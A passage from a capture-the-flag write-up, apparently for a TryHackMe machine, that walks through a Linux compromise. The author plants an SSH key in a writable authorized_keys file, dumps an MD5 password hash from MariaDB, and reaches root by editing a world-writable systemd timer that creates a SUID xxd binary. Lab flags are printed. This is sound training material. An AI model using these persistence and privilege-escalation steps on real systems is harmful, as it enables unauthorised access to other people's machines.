It's unusual that I have read access to this directory. I can't read the `user.txt`. It doesn't have a private key but it has `authorized_keys`. With this, I can just add my public key from my local machine and use my private key to login as Comte. 

```bash
echo "ssh-ed25519 AAAAC3Nz.................................." >> authorized_keys
```

```bash
ssh -i id_ed25519 comte@10.48.176.177      
The authenticity of host '10.48.176.177 (10.48.176.177)' can't be established.
ED25519 key fingerprint is: SHA256:Wi9tKpEgUZDvwRW1OwF7RTD07Am6rM2nfjJebfss6x8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.176.177' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@ip-10-48-176-177:~$ cat user.txt

THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

Earlier, I couldn't access mysql using Comte's credentials as www-data but now I can. 

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.000 sec)

MariaDB [users]> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | comte    | 5b0c2e1b4fe1410e47f26feff7f4fc4c |
+----+----------+----------------------------------+
1 row in set (0.000 sec)

MariaDB [users]> 

```

It looks like comte's password is hashed. Looking back at the script I found on `login.php`, the password is hashed by `md5`

```bash
    $filteredInput = filterOrVariations($username);
    //echo($filteredInput);
    // Hash the password (you should use a stronger hashing algorithm)
    $hashed_password = md5($pass);
```

Seems like a rabbit hole, `JohnTheRipper, Hashcat, Online md5 decrypts` doesn't work. Moving on
###### User enumeration

```bash
comte@ip-10-48-176-177:/home/ubuntu$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)

comte@ip-10-48-176-177:/home/ubuntu$ sudo -l 
User comte may run the following commands on ip-10-48-176-177:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

This is interesting because when I take a look at what it is running, it looks like some sort of script. Usually, when we are talking about services reload, there's a configuration file where we can have a command like `ExecStart`. That could be the `PrivEsc` if we have write permission to that file. 

```bash
comte@ip-10-48-176-177:~$ find /etc/systemd/system -name "exploit.*" 2>/dev/null
/etc/systemd/system/exploit.service
/etc/systemd/system/exploit.timer
/etc/systemd/system/timers.target.wants/exploit.timer
```

I tried running `sudo /bin/systemctl enable exploit.timer` and it pointed me to the configuration file.

```bash
comte@ip-10-48-176-177:~$ comte@ip-10-48-176-177:~$ sudo /bin/systemctl enable exploit.timer
Created symlink /etc/systemd/system/timers.target.wants/exploit.timer → /etc/systemd/system/exploit.timer.
```

```bash
comte@ip-10-48-176-177:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target

comte@ip-10-48-176-177:~$ ls -la /etc/systemd/system/timers.target.wants/exploit.timer
lrwxrwxrwx 1 root root 33 Dec 15 17:18 /etc/systemd/system/timers.target.wants/exploit.timer -> /etc/systemd/system/exploit.timer
```

Usually, when there is a `.timer` on /etc/systemd/system, there is also a `.service`. 

```bash
-rw-r--r--  1 root root  141 Mar 29  2024 exploit.service
-rwxrwxrwx  1 root root   87 Mar 29  2024 exploit.timer
```

```bash
comte@ip-10-48-176-177:/etc/systemd/system$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

So this service creates `xxd` in /opt as a `SUID`. This should be the PrivEsc to root. The main problem is that the service won't start because `OnBootSec=` is empty. All I need to is change it to `5s` and run the `sudo -l commands`

```bash
nano exploit.timer

[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=5s

[Install]
WantedBy=timers.target
```

then run the sudo permissions and the `xxd with SUID permissions` should appear in `/opt`

```bash
User comte may run the following commands on ip-10-48-176-177:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
comte@ip-10-48-176-177:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
comte@ip-10-48-176-177:/etc/systemd/system$ 
comte@ip-10-48-176-177:/etc/systemd/system$ sudo /bin/systemctl enable exploit.timer
comte@ip-10-48-176-177:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
comte@ip-10-48-176-177:/etc/systemd/system$ ls /opt
xxd
comte@ip-10-48-176-177:/etc/systemd/system$ ls -la /opt
total 28
drwxr-xr-x  2 root root  4096 Dec 15 17:32 .
drwxr-xr-x 19 root root  4096 Dec 15 16:37 ..
-rwsr-sr-x  1 root root 18712 Dec 15 17:32 xxd
```

`XXD with SUID permissions` can read files. With this, I don't really need to be root. I can just read the root flag.

```bash
comte@ip-10-48-176-177:/etc/systemd/system$ cd /opt
comte@ip-10-48-176-177:/opt$ LFILE=/root/root.txt
comte@ip-10-48-176-177:/opt$ ./xxd "$LFILE" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
comte@ip-10-48-176-177:/opt$ 
```

# GG!

